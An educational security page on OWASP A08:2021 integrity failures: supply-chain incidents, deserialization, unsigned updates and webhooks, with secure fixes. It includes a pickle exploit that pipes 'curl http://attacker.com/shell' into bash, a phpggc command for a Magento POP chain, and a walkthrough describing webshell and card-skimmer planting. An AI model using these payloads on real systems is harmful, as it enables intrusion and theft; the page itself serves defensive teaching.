OWASP-A08:2021

Software & Data Integrity Failures

Failures related to assumptions about software updates, critical data, and CI/CD pipelines without verifying integrity. Includes insecure deserialization — a category of bugs that often leads to RCE.

Difficulty: Hard
CI/CD Deserialization Supply Chain

Real-World Incidents

SolarWinds SUNBURST (2020) — 18,000+ Organizations

Russian state actors (APT29 / Cozy Bear) compromised SolarWinds' build pipeline and inserted malware called SUNBURST into a software update for the Orion network management platform. ~18,000 customers — including the U.S. Treasury, DHS, Microsoft, FireEye, and many Fortune 500s — auto-updated and installed the trojanized code. The malware created a backdoor for follow-on attacks. SolarWinds' CI/CD integrity was completely absent — there were no code-signing checks, no SBOM, no integrity verification of build artifacts.

The cost is estimated in the tens of billions of dollars. The U.S. government issued an executive order on software supply chain security in direct response.

Other Notable Incidents

  • 3CX DesktopApp (2023) — A trojanized version of the popular softphone was distributed through a compromised CI/CD pipeline and update server. 600,000+ companies affected, including Toyota, American Express, and Pepsi.
  • Magento Shoplifts (2022) — Insecure deserialization in Magento allowed attackers to achieve RCE on thousands of e-commerce sites and inject credit card skimmers.
  • CodeCov Bash Uploader (2021) — Attackers extracted credentials from a compromised Docker image of the CodeCov bash uploader, granting them access to hundreds of customer CI environments and the secrets inside.
  • PHP Pear Breach (2018) — A maintained backdoor was pushed to the central PHP package repository. Anyone who auto-updated got the backdoor.
  • event-stream npm (2018) — A maintainer handed over the package to a "new developer" who added a Bitcoin-stealing backdoor. 2M+ weekly downloads before discovery.
  • WooCommerce Object Injection (CVE-2023-28147) — PHP object injection in the WooCommerce Blocks plugin allowed shop takeover.

How It Works

1. Insecure Deserialization

Serialized data (Java, Python pickle, PHP serialize, .NET BinaryFormatter, Node JSON-with-reviver) contains type and structure information. If the application unserializes user-controlled data, the attacker can instantiate arbitrary objects and trigger "magic" methods that run code.

2. Auto-Update Without Verification

Applications that auto-update from a URL without checking a signature can be tricked into installing a trojanized version — exactly the SolarWinds pattern.

3. Unsigned CI/CD Artifacts

If your build pipeline doesn't sign and verify artifacts, an attacker who compromises any part of the chain (build server, registry, deploy step) can run anything.

4. Trusted Plugin Architecture

CMS and e-commerce platforms (WordPress, Magento, Shopify) allow third-party plugins. A malicious or vulnerable plugin gets the same privileges as the core platform.

5. Webhook Spoofing

Receiving webhooks (from GitHub, Stripe, etc.) without verifying the signature — so anyone can POST "deployment succeeded" with malicious artifacts.

Vulnerable Code Examples

Example 1: Python Pickle RCE (the most common form)

PythonVulnerable
import pickle

# ❌ Loading a pickle from user input
@app.post('/api/preferences')
def save_prefs():
    blob = request.data
    prefs = pickle.loads(blob)  # ⚠️ RCE here
    return {'ok': True}

# Attacker's payload
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell | bash',))

payload = pickle.dumps(Exploit())
# Send payload as POST body. pickle.loads() will run os.system.

Example 2: PHP Object Injection via unserialize()

PHPVulnerable
// ❌ Unserializing user-supplied data
class UserController {
    public function loadFromCookie() {
        $data = $_COOKIE['user_data'];
        $user = unserialize($data);
        // If a class with a magic method exists, it gets called
        return $user;
    }
}

// Attacker plants a "POP chain" — a series of objects whose
// destructors/wakeup chain executes a side effect like file write
// or command execution. Magento, WordPress, and many CMSes have
// well-known POP chains published in the wild.

Example 5: Auto-Update Without Signature Check

AnyVulnerable Pattern
// ❌ Download the update from a URL and run it
const update = await fetch('https://updates.myapp.com/latest');
const binary = await update.arrayBuffer();
fs.writeFileSync('/usr/local/bin/myapp', Buffer.from(binary));

// No signature check → if updates.myapp.com is compromised, every

Attack Walkthrough — PHP POP Chain on a Magento Store

1
Find a serialization entry point

Burp shows a request with a base64'd s:... payload in a cookie. The app calls unserialize() on it.

2
Find a gadget class

Run phpggc (PHP Generic Gadget Chains) against the Magento classpath. It generates a payload using built-in classes (e.g., Magento\Framework\...) that form a POP chain ending in file write or code execution.

3
Craft the payload

phpggc Magento2/RCE1 "system('id')" -b — produces a base64-encoded payload.

4
Inject via the cookie

Set the cookie in Burp Repeater, send the request. The deserialization triggers the gadget chain, writes a webshell, returns control. Now you can browse to /var/www/html/shell.php for full RCE.

5
Plant a skimmer

Inject JavaScript into checkout pages that copies every credit card form submission to attacker.com. The skimmer sits in the database, often for months.

Secure Approach

1. Never deserialize untrusted data — use plain JSON

PythonSecure
import json
from pydantic import BaseModel, ValidationError

class Preferences(BaseModel):
    theme: str
    language: str

@app.post('/api/preferences')
def save_prefs():
    try:
        # ✅ JSON has no type information, so no arbitrary code execution
        data = json.loads(request.data)
        prefs = Preferences(**data)  # Validate and coerce
    except (json.JSONDecodeError, ValidationError):
        return {'error': 'Invalid data'}, 400
    return {'ok': True}

2. If you must use serialization, sign it

Python (HMAC-signed JSON)Secure
import hmac, hashlib, json, base64

SECRET = b'my-app-secret'

def sign(data: bytes) -> str:
    sig = hmac.new(SECRET, data, hashlib.sha256).hexdigest()
    return base64.b64encode(data).decode() + '.' + sig

def verify(token: str):
    payload, sig = token.rsplit('.', 1)
    data = base64.b64decode(payload)
    if not hmac.compare_digest(sig, hmac.new(SECRET, data, hashlib.sha256).hexdigest()):
        raise ValueError('Invalid signature')
    return json.loads(data)

3. Verify webhook signatures

Node.js (Stripe-style)Secure
app.post('/webhook/deploy', express.raw({ type: 'application/json' }), (req, res) => {
    const signature = req.headers['stripe-signature'];  // HMAC of timestamp + body
    try {
        // ✅ Provider's library verifies HMAC
        const event = stripe.webhooks.constructEvent(
            req.body, signature, process.env.WEBHOOK_SECRET
        );
        if (event.type === 'deploy.success') {
            deployToProduction(event.data.object.build_url);
        }
        res.json({ received: true });
    } catch (err) {
        // ❌ Bad signature → reject
        return res.status(400).send('Invalid signature');
    }
});

4. Sign and verify updates (SLSA / sigstore)

CI/CDSecure
# ✅ Sign the build artifact in CI
- name: Sign artifact
  run: |
    cosign sign --key env://COSIGN_KEY ghcr.io/myorg/myapp:${{ github.sha }}

# ✅ Verify the signature before deployment
- name: Verify signature
  run: |
    cosign verify --key env://COSIGN_PUB ghcr.io/myorg/myapp:${{ github.sha }}

# Reference: SLSA framework (slsa.dev) for build integrity levels

Prevention Checklist

✅ Integrity by Default
  • Use digital signatures to verify software updates and CI/CD artifacts (SLSA L3+).
  • Use plain JSON (or Protocol Buffers) instead of native serialization formats.
  • If you must use native serialization, sign it and verify the signature before deserializing.
  • Restrict deserialization to allowlisted classes only — no unserialize() with user input.
  • Verify webhook signatures on all inbound webhooks.
  • Audit third-party plugins regularly. Restrict their permissions.
  • Generate a Software Bill of Materials (SBOM) for every release (CycloneDX or SPDX).
  • Use reproducible builds when possible — they make tampering detectable.
